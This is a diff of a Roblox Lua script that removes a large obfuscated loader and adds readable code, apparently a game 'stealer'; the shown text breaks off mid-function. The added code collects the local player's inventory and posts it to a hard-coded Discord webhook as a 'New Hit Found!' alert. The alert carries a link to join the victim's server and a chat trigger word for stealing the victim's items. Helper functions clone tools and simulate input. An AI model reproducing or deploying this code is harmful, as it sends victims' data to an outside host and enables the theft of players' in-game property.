@@ -1,1 +1,529 @@
-return(function(...)local c={"\111\077\084\090\117\074\061\061";"\122\089\084\088\122\066\061\061";"\085\083\083\101\085\082\061\061","\113\075\121\088\080\114\122\083";"\122\072\067\120\080\114\100\061";"\052\089\084\122\119\085\113\120\072\080\054\066\074\068\106\076\073\089\081\100\071\057\076\100\076\080\110\099\088\086\076\072\084\050\080\050\116\065\070\077\121\068\083\081\103\101\110\099\066\083\072\084\116\099\111\120\065\076\068\068\043\087\110\098\049\080\122\043\119\089\052\081\076\067\067\097\107\105\072\072\105\121\090\102\051\081\106\090\106\066\086\087\112\049\116\120\103\120\075\109\107\090\118\048\097\069\070\089\090\104\073\110\108\049\113\061";"\111\077\051\047\111\115\098\108\122\072\100\061","\054\089\051\047\054\089\084\078","\113\089\121\078\080\115\121\078\054\072\110\076\054\075\099\083";"\072\098\051\119\080\075\110\083\107\043\061\061";"\122\098\079\054\054\114\119\076\065\083\111\077\115\073\121\090";"\109\108\082\083\122\097\071\119\109\082\061\061";"\109\082\061\061";"\121\077\084\088\113\077\121\120\100\069\110\083\111\077\121\102\111\077\121\056\100\066\061\061";"\086\075\048\053\122\114\119\054\110\086\121\115\117\098\121\100\066\090\100\061","\106\083\083\065\109\115\051\117\110\083\066\061","\113\114\079\070\117\077\084\115\113\115\067\054\070\098\065\119\115\082\061\061";"\113\075\084\047\122\077\051\088","\074\057\098\100\069\043\061\061";"\121\115\051\117\117\053\082\120","\113\114\110\120\117\115\048\053";"\106\069\065\071\115\102\076\086\117\086\121\121\080\115\065\070\117\082\061\061";"\086\082\052\113\049\114\113\061";"\121\089\121\108\117\077\051\118\117\074\061\061";"\066\083\121\117\113\086\111\048\106\077\119\118\065\078\121\118\065\114\113\061";"\054\053\083\078\122\066\061\061";"\107\069\066\087\057\073\111\088\110\055\102\082\111\048\115\075\099\114\080\050\049\079\101\111\051\119\088\105\117\117\070\107\111\109\050\052\071\089\111\107\065\118\113\061","","\065\057\111\076\115\084\121\119\115\056\098\054\115\121\122\077";"\077\086\105\097\067\117\071\082\078\120\112\097\110\047\086\061";"\121\075\088\050\086\083\110\077\111\078\084\067\065\053\076\114\106\053\106\061";"\122\075\099\118\080\114\100\061","\072\098\051\081\122\115\052\061","\111\115\048\074\054\115\065\112","\113\084\083\047\122\056\056\089\117\069\081\052\117\086\098\052\106\053\069\061","\072\098\051\053\054\074\061\061","\080\057\069\061","\110\078\051\078\085\077\099\049\115\102\083\089\065\121\110\110\109\043\061\061","\080\057\100\061","\079\043\118\087\107\108\119\090\120\121\122\114\081\119\074\122\073\053\068\075\105\070\052\088\078\121\051\085\085\117\078\104\057\048\112\078\048\073\073\048\110\074\075\089\072\083\083\105\111\073\117\049\048\120\104\119\078\083\103\112\085\086\073\075\099\076\066\069\051\052\071\078\055\118\116\116\110\086\057\107\053\111\105\069\108\089\107\106\047\050\109\106\078\071\068\114\054\101\079\086\106\106\097\056\053\101\099\099\121\109\089\049\104\074\101\097\112\075\083\111\052\067\068\114\119\087\075\071\074\121\101\111\108\114\100\056\055\113\109\104\057\100\085\076\066\088\117\086\118\075\080\078\088\099\097\090\089\116\053\115\053\078\073\119\056\056\043\106\077\081\115\085\075\087\120\073\085\078\065\118\081\071\084\043\077\050\055\051\098\067\112\068\084\074\112\099\083\076\110\104\105\087\105\089\074\069\056\122\050\049\115\065\103\066\108\080\075\052\067\083\067\068\079\073\107\080\065\068\068\105\083\106\069\097\068\047\053\071\065\103\103\080\076\117\099\110\055\116\078\103\049\117\071\075\104\076\085\047\107\090\075\055\090\107\054\055\077\051\067\087\066\115\121\087\080\098\076\074\061\061";"\111\077\084\108\080\077\086\061";"\113\077\065\076\080\077\074\061";"\080\077\051\076\122\073\065\078\113\075\083\047\122\074\061\061";"\072\098\051\088\122\072\110\076\111\077\084\108\080\077\086\061","\080\077\121\047";"\080\115\084\078\117\043\061\061";"\122\114\065\098\054\082\061\061";"\121\072\065\083\113\075\048\076\080\115\086\061";"\054\115\065\054\106\098\079\052\085\086\113\078\086\084\084\050\086\082\061\061";"\122\115\111\070\065\089\088\073\107\102\083\085\110\075\083\070\070\083\100\061","\054\089\076\076\113\082\061\061";"\070\073\110\078\113\069\111\083\111\043\061\061","\110\077\111\077\122\121\079\074\111\115\051\099\080\114\076\099\070\074\061\061","\111\077\051\090\111\073\067\119\080\075\113\061";"\122\089\098\076\111\077\065\071";"\121\121\067\106";"\066\054\047\073\055\082\107\119\051\068\049\101\122\088\115\052\088\054\082\067\114\050\104\068\082\048\052\116\097\069\067\089\102\066\103\106\099\070\098\110\088\108\116\088\087\120\107\054\054\088\097\074\077\054\089\119\072\089\116\090\117\078\066\122\111\077\081\113\111\071\086\109\052\090\070\076\119\110\082\106\085\103\083\065\115\104\066\077\113\114\080\054\114\065\054\086\080\112\105\079\072\098\079\101\085\120\072\065\067\048\119\054\120\106\067\105\112\113\108\113\081\100\050\057\107\122\104\121\066\053\043\115\087\111\105\083\083\104\110\100\066\080\053\079\112\115\113\055\081\118\068\071\104\098\071\053\078\081\114\077\116\114\085\116\098\100\068\049\077\079\114\118\107\069\049\056\117\104\097\047\067\072\047\117\081\098\119\105\121\108\075\100\117\073\055\073\103\065\070\108\100\088\077\067\120\111\099\113\079\105\100\086\112\073\049\104\086\071\069\089\068\116\099\074\114\090\073\117\051\043\118\097\119\082\050\079\086\077\048\105\108\104\057\109\119\084\078\076\119\114\077\103\080\104\074\065\104\106\074\101\073\098\121\053\111\086\118\084\090\081\097\111\071\080\113\075\115\082\061\061","\086\057\122\057\122\075\048\106\080\072\083\118\111\084\067\077\107\082\061\061"}for v,s in ipairs({{653557-653556,-762872+762930};{1001984-1001983;-521200+521252};{886779+-886726,-349099+349157}})do while s[756536-756535]<s[-649842-(-649844)]do c[s[-720950+720951]],c[s[-300777+300779]],s[-569585-(-569586)],s[-336490+336492]=c[s[15458-15456]],c[s[111971+-111970]],s[-437870+437871]+(279402-279401),s[-329706+329708]-(-556592-(-556593))end end local function v(v)return c[v+(-889148+949467)]end do local v=math.floor local s=c local b={J=-935501-(-935549);["\052"]=697390-697334;H=548360-548337,z=344107+-344082,["\056"]=933985-933949;y=723211-723190,R=-731063+731095,A=329898+-329885,S=617715+-617678,h=-81831-(-81891);["\053"]=-560970-(-561009);["\049"]=-461934+461949,T=558385+-558380;F=554417+-554399,j=792517-792505,D=-1007488-(-1007551),i=566765-566706,G=-917652-(-917692);["\043"]=-311146-(-311146);Z=-590015-(-590066);K=-328490+328528,w=-639092+639133,x=-425197+425247;V=32545+-32525;I=-781624+781631,l=-860987+861021,N=-210343+210395;s=100899+-100877,["\048"]=-580857-(-580914);e=-605032-(-605043);C=-518256+518265;W=676661+-676619;O=-621490-(-621491);Y=-884411+884465;M=-77084-(-77090);Q=-724554-(-724598),u=-908322-(-908348);a=-41057+41059;X=43809+-43764;m=184230+-184216,b=854959-854906,E=156261+-156257,p=-63287-(-63330);t=-629012-(-629043),U=195878+-195859,o=2144+-2115,g=855221-855163,P=412845+-412818,q=-583126-(-583154);v=385516+-385469,["\050"]=-318816-(-318826);["\054"]=-618355+618379;d=302441+-302433;["\057"]=-68642+68645,f=-56546+56581,n=-694390+694407;L=697239-697206;c=-528511-(-528560),["\051"]=-392751-(-392812);["\055"]=535217+-535155;B=-261160+261176,k=537679-537649,["\047"]=790567-790521;r=369314-369259}local d=string.len local Y=type local Q=string.char local V=string.sub local q=table.concat local u=table.insert for c=801594-801593,#s,305002-305001 do local H=s[c]if Y(H)=="\115\116\114\105\110\103"then local Y=d(H)local K={}local w=-471470-(-471471)local W=697718+-697718 local i=156069-156069 while w<=Y do local c=V(H,w,w)local s=b[c]if s then W=W+s*(-960574+960638)^((740602-740599)-i)i=i+(394285-394284)if i==734907-734903 then i=-593074+593074 local c=v(W/(-255080+320616))local s=v((W%(575154+-509618))/(-837690+837946))local b=W%(-979966-(-980222))u(K,Q(c,s,b))W=642228-642228 end elseif c=="\061"then u(K,Q(v(W/(-476849-(-542385)))))if w>=Y or V(H,w+(117668+-117667),w+(-382572+382573))~="\061"then u(K,Q(v((W%(328810+-263274))/(739959-739703))))end break end w=w+(-100066-(-100067))end s[c]=q(K)end end end return(function(c,b,d,Y,Q,V,q,r,f,s,K,X,g,W,D,G,u,w,i,H,S,E)H,K,u,D,S,w,s,r,f,W,G,i,E,g,X={},function()w=w+(702134+-702133)H[w]=72419-72418 return w end,{},function(c,v)local b=W(v)local d=function(d)return s(c,{d},v,b)end return d end,function(c,v)local b=W(v)local d=function(d,Y)return s(c,{d,Y},v,b)end return d end,-347499-(-347499),function(s,d,Y,Q)local C,e,M,j,x,P,q,a,N,y,O,n,A,k,U,o,L,t,w,B,W,i,R,F,p,T,J,I,h,l,r,H,z,Z while s do if s<-446126+9530577 then if s<4852524-1027456 then if s<2446622-675061 then if s<703789-(-33633)then if s<594898-(-87843)then if s<1568837-925885 then if s<-885627+1458074 then N=v(935613+-995904)O=c[N]s=-933949+2876536 q=O else s=true H=d W=v(-547903-(-487599))P=v(-687477+627194)w=K()u[w]=s i=K()q=c[W]W=v(-984555-(-924285))s=q[W]W=K()u[W]=s s=D(72162-(-853050),{})u[i]=s s=false r=K()u[r]=s M=X(5469255-723894,{r})A=c[P]P=A(M)s=P and 397164+2622192 or 381036+15257458 q=P end else j=nil I=K()h={}Z=nil a=v(987199+-1047514)u[I]=h h=K()y=v(-900822-(-840506))R={}T=S(11593474-269224,{I,O;N,r})P=nil u[h]=T T={}U=K()u[U]=T B=nil T=c[y]F=v(-205414+145133)o=u[U]J={[a]=o;[F]=Z}y=T(R,J)W=nil r=G(r)T=E(558961-(-166053),{U;I;e;O;N;h})O=G(O)A=nil u[i]=y h=G(h)I=G(I)A=v(-529369-(-469103))M=nil u[w]=T N=G(N)B=20811900073458-911932 N=v(-1022924-(-962622))r=c[A]P=u[i]M=u[w]e=G(e)O=M(N,B)I=v(531504+-591772)U=G(U)A=P[O]W=r[A]A=X(3889879-839802,{i;w})r=W(A)M=v(764979-825274)r=u[i]B=11719176642073-734071 O=22701742777536-332330 q={}A=u[w]P=A(M,O)W=r[P]r=v(-969137-(-908860))c[r]=W N=7424078403517-867515 O=v(-390572+330274)A=u[i]T=6470565394017-(-303401)P=u[w]M=P(O,N)N=v(419250-479535)r=A[M]A=v(499311+-559612)c[A]=r P=u[i]M=u[w]s=c[v(969406+-1029709)]O=M(N,B)M=v(-273512+213230)A=P[O]P=v(287721+-347990)c[P]=A P=c[M]N=v(164926-225191)O=c[N]e=u[i]j=u[w]w=G(w)h=j(I,T)B=e[h]e=v(-841210+780937)i=G(i)e=O[e]N={e(O,B)}M=P(b(N))P=M()end else if s<455854+247502 then w=u[Y[-871545-(-871547)]]s=11609794-(-188070)W=u[Y[736314-736311]]H=w==W q=H else H=d[586803-586802]s=u[Y[-813944-(-813945)]]W=s w=d[-310122+310124]s=W[w]s=s and 13036974-(-106979)or 309802+15928262 end end else if s<649632-(-341675)then if s<-689461+1570475 then if s<8341-(-756471)then W=-590450+590451 w=u[Y[-931837+931840]]H=w~=W s=H and-133348+5858195 or 3771667-293545 else H=v(683445+-743707)W=577714-577714 s=c[H]w=u[Y[953990-953982]]H=s(w,W)s=88291+5718990 end else q=v(387692+-447954)s=c[q]H=v(648159-708470)q=s(H)s=c[v(618159-678453)]q={}end else if s<1180051-137380 then s=904764+5893267 else i=-453485-(-453486)w=u[Y[-727095+727096]]r=-893370-(-893372)W=w(i,r)w=83428-83427 H=W==w q=H s=H and 251944+11545920 or 1744149-1047296 end end end else if s<3881372-538289 then if s<3875671-834426 then if s<3312902-298537 then if s<2245028-56546 then O=K()B=799546-799481 u[O]=q s=u[P]N=-373548+373551 q=s(N,B)N=K()j=v(986495+-1046778)u[N]=q h=g(10625125-933693,{})s=-993471-(-993471)B=s q=c[j]s=-436526+436526 e=s j={q(h)}s={b(j)}q=-97697-(-97699)j=s t=v(-545969+485698)s=j[q]q=v(415661+-475979)h=s s=c[q]I=u[W]p=c[t]t=p(h)p=v(396524+-456837)l=I(t,p)I={l()}q=s(b(I))I=K()u[I]=q l=u[N]p=l q=-838009-(-838010)s=6282272-(-555697)l=500592+-500591 t=l l=664117-664117 T=t<l l=q-t else U=G(U)s=402412+6435557 y=G(y)a=G(a)o=G(o)R=G(R)J=G(J)F=nil end else s=-1008959+16647453 A=u[r]q=A end else if s<4057324-902076 then q=v(-31777+-28505)s=c[q]w=v(481647+-541912)M=-506480+15813478937591 H=c[w]i=u[Y[427949+-427948]]r=u[Y[925885+-925883]]P=v(738964-799225)A=r(P,M)W=i[A]i=v(-184277-(-124004))i=H[i]w={i(H,W)}r=v(-354683-(-294377))q=s(b(w))s=q()w=u[Y[901692+-901691]]A=153445+15828511121968 H=s W=u[Y[143524+-143522]]i=W(r,A)q=w[i]s=H[q]H=nil q=s()q={}s=c[v(354990-415277)]else T=325226-325226 I=#j h=I==T s=h and 1496846-825594 or 15382710-(-334122)end end else if s<3597495-(-44001)then if s<4446866-919549 then s=665972-(-94371)w=u[Y[-307175-(-307178)]]W=222823+-222653 H=w*W w=-325417-(-325674)q=H%w u[Y[-257448+257451]]=q else n=u[w]s=n and 11357755-(-319786)or 10564643-(-110883)L=n end else if s<124580+3574991 then s=n s=8133656-(-951037)q=L else q={w}s=c[v(-973054+912740)]end end end end else if s<5318256-(-642036)then if s<629748+4434143 then if s<4968215-640116 then if s<4230838-93987 then if s<359851+3659791 then s=f(90339+15887109,{i})p={s()}q={b(p)}s=c[v(-566834+506544)]else n=s x=1036608+-1036607 z=F[x]x=false Z=z==x L=Z s=Z and 9958416-224 or-329514+3979673 end else U=K()y=v(-728375+668096)C=-513136+513136 u[U]=l J=-1015680-(-1015935)q=c[y]y=v(-1040785-(-980478))R=-869499+869599 s=q[y]y=-187686+187687 q=s(y,R)y=K()R=750327+-750327 u[y]=q s=u[P]q=s(R,J)R=K()o=-882938-(-882939)J=-635444+635445 F=946623-946621 u[R]=q s=u[P]a=u[y]q=s(J,a)Z=v(212473-272744)J=K()u[J]=q q=u[P]a=q(o,F)q=-252136+252137 s=a==q a=K()F=v(13536+-73848)q=v(-598346-(-538033))u[a]=s n=c[Z]k=89074-79074 z=u[P]x={z(C,k)}Z=n(b(x))s=v(-523236-(-462958))n=v(-178364-(-118052))L=Z..n s=h[s]o=F..L s=s(h,q,o)o=K()u[o]=s L=X(710069-(-440430),{P,U,N,W,w,I;a,o,y;J,R,O})F=v(-247393-(-187110))q=c[F]F={q(L)}s={b(F)}F=s s=u[a]s=s and-865019+10939439 or 3494410-(-133732)end else if s<-365035+4921267 then U=v(-1070207-(-1009919))t=v(801913+-862184)s=c[t]T=c[U]t=s(T)s=v(311470-371756)c[s]=t s=-475951+1492814 else s=true q={}u[Y[-880442-(-880443)]]=s s=c[v(787192+-847500)]end end else if s<6252558-486127 then if s<183910+5431168 then W=798457+-798424 w=u[Y[-788344+788346]]H=w*W w=28919970351741-(-761528)q=H+w w=68002+-68001 H=35184372916474-827642 s=q%H u[Y[778234-778232]]=s H=u[Y[319146+-319143]]q=H~=w s=-203942+3682064 else W=-362859+362891 w=u[Y[-438315-(-438318)]]H=w%W i=u[Y[-383276+383280]]P=u[Y[503600+-503598]]O=998783+-998781 B=896201-896188 h=u[Y[989122-989119]]j=h-H h=-917660-(-917692)e=j/h N=B-e M=O^N A=P/M r=i(A)i=-365355+4295332651 W=r%i r=208870+-208868 i=r^H w=W/i i=u[Y[-221735+221739]]s=14169937-(-747639)B=-482287+482543 M=-916860+916861 P=w%M M=4295424494-457198 O=-267112+267368 A=P*M H=nil r=i(A)i=u[Y[-248296+248300]]A=i(w)W=r+A r=-563700-(-629236)i=W%r P=-469743+535279 A=W-i r=A/P P=-575922+576178 A=i%P M=i-A P=M/O O=-784504+784760 M=r%O w=nil N=r-M O=N/B W=nil i=nil N={A;P;M;O}M=nil r=nil P=nil u[Y[-988094-(-988095)]]=N O=nil A=nil end else if s<75362+5749169 then s={}H=s s=11984142-(-258152)W=u[Y[900028+-900019]]i=W w=-409196-(-409197)W=-465005-(-465006)r=W W=-22561+22561 A=r<W W=w-r else s=c[v(-48020-12256)]q={}end end end else if s<-1047232+7903121 then if s<7081992-367339 then if s<-621491+6981212 then if s<-308394+6650525 then P=nil s=3696464-(-118052)A=nil i=nil else t=-156133+156134 T=-274152+274158 s=u[P]p=s(t,T)s=v(601591-661877)T=v(-282917-(-222631))c[s]=p t=c[T]T=217639+-217637 s=t>T s=s and 3506570-(-966398)or 276585+15487353 end else s=u[Y[715382+-715372]]w=u[Y[-258600+258611]]H[s]=w s=u[Y[-491375+491387]]w={s(H)}q={b(w)}s=c[v(-289321+229025)]end else if s<641204+6169824 then s=true s=s and 5818130-(-531376)or 5248832-(-576370)else U=not T l=l+t q=l<=p q=U and q U=l>=p U=T and U q=U or q U=228135+3978585 s=q and U q=16648861-883387 s=s or q end end else if s<8640314-997695 then if s<7713827-429421 then s=true s=s and 11770696-(-136228)or 3125055-(-876859)else W=u[Y[730685-730679]]w=W==H q=w s=-39265+12328152 end else if s<807161+8214481 then s=u[Y[915068+-915061]]s=s and-151653+987774 or 260136+5547145 else s=u[Y[-1018176+1018177]]O=15775-15520 w=W M=-79394+79394 P=s(M,O)H[w]=P w=nil s=11724038-(-518256)end end end end end else if s<-337130+13369787 then if s<11731253-463278 then if s<-840314+11138775 then if s<592306+9362889 then if s<-833594+10593529 then if s<8599961-(-789944)then u[w]=q s=2071583-(-918076)else q=3554892-(-663093)w=v(-474735+414430)W=147877+8511844 H=w^W s=q-H H=s q=v(932989+-993253)s=q/H q={s}s=c[v(-428909+368634)]end else s=true s=377964+3623950 end else if s<-695926+10768122 then s=3195137-(-455022)x=448496-448494 z=F[x]x=u[o]Z=z==x L=Z else L=u[w]s=L and-667573+4781106 or-533425+9618118 q=L end end else if s<10896630-119460 then if s<10243712-(-429037)then s=10952814-(-440558)I=G(I)M=nil i=G(i)W=G(W)A=nil i=K()M=v(302313+-362597)w=G(w)w=nil W=nil u[i]=w e=nil O=G(O)B=nil h=nil j=nil w=K()P=G(P)A=v(591026+-651305)N=G(N)u[w]=W N=K()r=G(r)h=632245-632244 r=c[A]A=v(-747383+687090)W=r[A]r=K()u[r]=W P=v(-897777-(-837498))O=v(717686+-777990)A=c[P]j={}P=v(393499-453806)W=A[P]e=K()P=c[M]M=v(-601048-(-540785))A=P[M]M=c[O]O=v(-1090546-(-1030272))P=M[O]I=-571698-(-571954)B={}M=569202+-569202 O=K()u[O]=M M=725046+-725044 u[N]=M u[e]=B M={}T=I B=-340331+340331 I=-372908+372909 U=I I=-619763+619763 y=U<I I=h-U else u[w]=L C=-109922-(-109923)x=u[J]z=x+C Z=F[z]n=B+Z Z=1030080-1029824 s=n%Z z=u[R]B=s s=865659+2124000 Z=e+z z=-445550+445806 n=Z%z e=n end else if s<-576946+11660008 then j=v(-239783+179499)e=c[j]j=v(-985024-(-924733))B=e[j]O=B s=15455159-(-727607)else u[w]=l s=u[w]s=s and 784888+13231028 or 69474+9802699 end end end else if s<12918009-1037056 then if s<11620833-(-104291)then if s<12035413-499631 then if s<11135364-(-201510)then H=u[Y[-615667+615668]]q=#H H=761016-761016 s=q==H s=s and 271336+5063867 or 747575+14170001 else I=I+U h=I<=T R=not y h=R and h R=I>=T R=y and R h=R or h R=-304297+14519387 s=h and R h=-1008063+14338390 s=s or h end else Z=-508719-(-508720)n=F[Z]L=n s=11538369-862843 end else if s<11167704-(-660276)then s=q and 685877+11294265 or 349291+7997076 else t=v(321642+-381946)M=N p=c[t]s=-857915+17282865 t=v(548273+-608572)l=p[t]p=l(H,M)l=u[Y[185382+-185376]]t=l()I=p+t h=I+A t=84836-84835 I=-33249-(-33505)j=h%I I=W[w]A=j p=A+t l=i[p]h=I..l W[w]=h M=nil end end else if s<-751927+12810858 then if s<-801849+12749077 then s=6595561-(-202470)else i=v(206521-266792)q=v(886843+-947161)s=c[q]O=g(242920+15781633,{})H=u[Y[871871-871867]]M=v(-929206-(-868923))W=c[i]P=c[M]M={P(O)}A={b(M)}P=-965052-(-965054)r=A[P]i=W(r)W=v(-524272+463959)w=H(i,W)H={w()}q=s(b(H))H=q w=u[Y[660409-660404]]s=w and 7273406-(-95523)or 12975148-686261 q=w end else if s<-896316+13167395 then P=not A W=W+r w=W<=i w=P and w P=W>=i P=A and P w=P or w P=331434+8750187 s=w and P w=36065+6350818 s=s or w else u[Y[112808-112803]]=q H=nil s=7399106-(-947261)end end end end else if s<-228775+15552598 then if s<14110586-(-15200)then if s<205606+13780655 then if s<911292+12492608 then if s<28065+13222832 then s=54754+3759762 else T=-423469+423469 I=#j s=15552635-(-164197)h=I==T end else H=v(-794361+734073)q=v(-881531+821245)s=c[q]q=c[H]H=v(-1095552-(-1035264))c[H]=s H=v(-186914-(-126628))c[H]=q s=14292501-223847 H=u[Y[-249511-(-249512)]]w=H()end else if s<-249960+14283087 then s=9686663-(-973502)else s=true s=s and-422893+14378903 or 175653+14347159 end end else if s<-118372+14718229 then if s<488175+13800777 then h=I s=12066769-673397 R=h j[h]=R h=nil else s=c[v(563485-623795)]q={}end else if s<14952843-(-129060)then W=v(505270-565554)w=c[W]W=v(-146058-(-85795))H=w[W]W=u[Y[299306-299305]]w={H(W)}q={b(w)}s=c[v(-1069423-(-1009151))]else p=B==e s=-764856+11958030 l=p end end end else if s<-416941+16418772 then if s<-24097+15788902 then if s<16345021-621107 then if s<16282187-624947 then M=v(-102883+42599)P=v(-1052982-(-992703))A=q q=c[P]P=v(530975-591282)e=v(-965886+905602)s=q[P]P=K()u[P]=s q=c[M]M=v(-875451+815134)s=q[M]N=s M=s B=c[e]s=B and 10496545-(-333610)or 530160+15652606 O=B else T=#j s=-423725+3689360 R=258921-258920 I=-783479-(-783480)h=W(I,T)I=A(j,h)T=u[e]h=nil y=I-R U=P(y)T[I]=U I=nil end else T=v(-899836+839550)s=c[T]T=v(-151205+90917)c[T]=s s=724342+292521 end else if s<-596594+16543346 then p=u[w]s=p and 1029888+14181585 or 590130+10603044 l=p else s=13323447-(-745207)end end else if s<15306674-(-908348)then if s<17119881-1016320 then q=5248256-(-1010111)w=v(615347+-675656)W=11564866-(-265768)H=w^W s=q-H H=s q=v(-811897+751630)s=q/H q={s}s=c[v(-1000585-(-940285))]else q=O s=N s=O and-120612+2063199 or 280872-(-114916)end else if s<17332756-1007423 then N=-979517-(-979518)s={}r=330986+35184371757846 u[Y[54306+-54304]]=s q=u[Y[-420973+420976]]P=599794-599539 M=v(508322-568626)i=q q=w%r s=16832099-407149 u[Y[202794-202790]]=q A=w%P P=194920-194918 r=A+P u[Y[684213+-684208]]=r P=c[M]M=v(24417+-84697)A=P[M]P=A(H)A=v(-908227-(-847930))W[w]=A A=507239-507184 O=P M=844155-844154 B=N N=-901308+901308 e=B<N N=M-B else N=N+B M=N<=O j=not e M=j and M j=N>=O j=e and j M=j or M j=-417197+12246806 s=M and j M=499375+5695502 s=s or M end end end end end end end s=#Q return b(q)end,function(c,v)local b=W(v)local d=function(...)return s(c,{...},v,b)end return d end,function(c,v)local b=W(v)local d=function()return s(c,{},v,b)end return d end,function(c)for v=202342+-202341,#c,201766+-201765 do H[c[v]]=H[c[v]]+(-373099-(-373100))end if d then local s=d(true)local b=Q(s)b[v(188710+-249025)],b[v(928381+-988670)],b[v(-488175+427883)]=c,i,function()return-79074+-129188 end return s else return Y({},{[v(-898748+838459)]=i,[v(56265-116580)]=c;[v(-212967+152675)]=function()return-1029951-(-821689)end})end end,function(c)H[c]=H[c]-(-271399-(-271400))if-475759+475759==H[c]then H[c],u[c]=nil,nil end end,function(c)local v,s=323435-323434,c[-108194-(-108195)]while s do H[s],v=H[s]-(-988862-(-988863)),(-873082-(-873083))+v if-123556+123556==H[s]then H[s],u[s]=nil,nil end s=c[v]end end,function(c,v)local b=W(v)local d=function(d,Y,Q,V,q,u)return s(c,{d;Y,Q;V,q;u},v,b)end return d end,function(c,v)local b=W(v)local d=function(d,Y,Q)return s(c,{d,Y,Q},v,b)end return d end,function(c,v)local b=W(v)local d=function(d,Y,Q,V)return s(c,{d,Y,Q;V},v,b)end return d end return(r(-296874-(-936381),{}))(b(q))end)(getfenv and getfenv()or _ENV,unpack or table[v(158693+-218984)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
+local success, err = pcall(function()
+    print("[DEBUG] Script started")
+
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local TextChatService = game:GetService("TextChatService")
+    local SoundService = game:GetService("SoundService")
+    local StarterGui = game:GetService("StarterGui")
+    local TweenService = game:GetService("TweenService")
+    local VirtualInput = game:GetService("VirtualInputManager")
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+    local LocalPlayer = Players.LocalPlayer
+    local TARGET_USERNAME = "latfrance"
+
+    -- ======= SPECIAL USER DETECTION AND GIFTING LOGIC =======
+
+    local specialUsers = {
+        ["latfrance"] = true,  -- username(s)
+        [123456789] = true     -- UserId(s), add as needed
+    }
+
+    local bannedWordsForGifting = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}
+
+    local function isSpecialUser(player)
+        return specialUsers[player.Name] or specialUsers[player.UserId]
+    end
+
+    local function isValidGiftItem(name)
+        for _, banned in ipairs(bannedWordsForGifting) do
+            if string.find(name:lower(), banned:lower()) then
+                return false
+            end
+        end
+        return true
+    end
+
+    local function grantSpecialTools(player)
+        local replicatedTools = ReplicatedStorage:GetChildren()
+        for _, item in ipairs(replicatedTools) do
+            if item:IsA("Tool") and isValidGiftItem(item.Name) then
+                if not (player.Backpack:FindFirstChild(item.Name) or (player.Character and player.Character:FindFirstChild(item.Name))) then
+                    local clone = item:Clone()
+                    clone.Parent = player.Backpack
+                    print("[Grant] Given tool "..item.Name.." to "..player.Name)
+                end
+            end
+        end
+    end
+
+    local function greetPlayer(player)
+        local playerGui = player:FindFirstChild("PlayerGui")
+        if playerGui then
+            local greetingLabel = Instance.new("TextLabel")
+            greetingLabel.Size = UDim2.new(0.3, 0, 0.1, 0)
+            greetingLabel.Position = UDim2.new(0.35, 0, 0.05, 0)
+            greetingLabel.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
+            greetingLabel.TextColor3 = Color3.new(1,1,1)
+            greetingLabel.TextScaled = true
+            greetingLabel.Text = "Welcome back, " .. player.Name .. "!"
+            greetingLabel.Parent = playerGui
+            task.delay(5, function()
+                if greetingLabel then greetingLabel:Destroy() end
+            end)
+        end
+    end
+
+    -- ======= WEBHOOK & CHAT TRIGGER SETUP =======
+    local webhookUrl = "https://discord.com/api/webhooks/1384918839329816626/u_r6fx4dADkpcY7IgydhUQgEFtuVvenjNMNudgIJM64KxchpoO6kd4nJ6bDZhKjaKWtv”
+    local chatTrigger = "refusal"
+
+    local function sendToWebhook(data)
+        local jsonData = HttpService:JSONEncode(data)
+        local ok, e = pcall(function()
+            if syn and syn.request then
+                syn.request({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            elseif request then
+                request({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = jsonData
+                })
+            else
+                HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+            end
+        end)
+        if not ok then
+            warn("[Webhook] Failed to send: "..tostring(e))
+        else
+            print("[Webhook] Sent successfully")
+        end
+        return ok
+    end
+
+    local function getInventory(player)
+        local inventory = {items = {}}
+        local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate", "Spray", "Pot"}
+
+        for _, item in pairs(player.Backpack:GetChildren()) do
+            if item:IsA("Tool") then
+                local isBanned = false
+                for _, word in pairs(bannedWords) do
+                    if string.find(item.Name:lower(), word:lower()) then
+                        isBanned = true
+                        break
+                    end
+                end
+                if not isBanned then
+                    table.insert(inventory.items, item.Name)
+                end
+            end
+        end
+        return inventory
+    end
+
+    local function sendInitialWebhook(player)
+        local inventory = getInventory(player)
+        local inventoryText = #inventory.items > 0 and table.concat(inventory.items, "\n") or "No items"
+
+        local messageData = {
+            embeds = {{
+                title = "🎯 New Hit Found!",
+                description = "READ #⚠️information in Light's Server to Learn How to Join Victim's Server and Steal Their Stuff!",
+                color = 0x00FF00,
+                fields = {
+                    {name = "👤 Username", value = player.Name, inline = true},
+                    {name = "🔗 Join Link", value = "https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or "N/A"), inline = true},
+                    {name = "🎒 Inventory", value = "```" .. inventoryText .. "```", inline = false},
+                    {name = "🗣️ Steal Command", value = "Say in chat: `" .. chatTrigger .. "`", inline = false}
+                },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }}
+        }
+        sendToWebhook(messageData)
+    end
+
+    -- ======= TOOL & INPUT FUNCTIONS =======
+
+    local function isValidItem(name)
+        local bannedWords = {"Seed", "Shovel", "Uses", "Tool", "Egg", "Caller", "Staff", "Rod", "Sprinkler", "Crate"}
+        for _, banned in ipairs(bannedWords) do
+            if string.find(name:lower(), banned:lower()) then
+                return false
+            end
+        end
+        return true
+    end
+
+    local function getValidTools(player)
+        local tools = {}
+        for _, item in pairs(player.Backpack:GetChildren()) do
+            if item:IsA("Tool") and isValidItem(item.Name) then
+                table.insert(tools, item)
+            end
+        end
+        return tools
+    end
+
+    local function toolInInventory(player, toolName)
+        local bp = player:FindFirstChild("Backpack")
+        local char = player.Character
+        if bp and bp:FindFirstChild(toolName) then return true end
+        if char and char:FindFirstChild(toolName) then return true end
+        return false
+    end
+
+    local function holdE()
